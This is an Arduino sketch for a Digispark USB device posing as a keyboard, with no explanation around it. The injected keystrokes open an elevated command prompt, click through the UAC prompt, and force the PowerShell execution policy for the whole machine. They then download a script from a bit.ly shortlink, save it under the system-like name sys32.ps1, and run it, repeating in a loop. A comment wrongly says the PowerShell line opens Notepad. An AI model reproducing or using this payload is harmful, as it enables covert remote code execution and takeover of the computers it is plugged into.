#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(1000);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER , MOD_CONTROL_RIGHT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("powershell"); //opens notepad
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force");
  DigiKeyboard.delay(2000);  
  DigiKeyboard.println("Invoke-RestMethod -Uri bit.ly/curroneBox > .\sys32.ps1; .\sys32.ps1");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}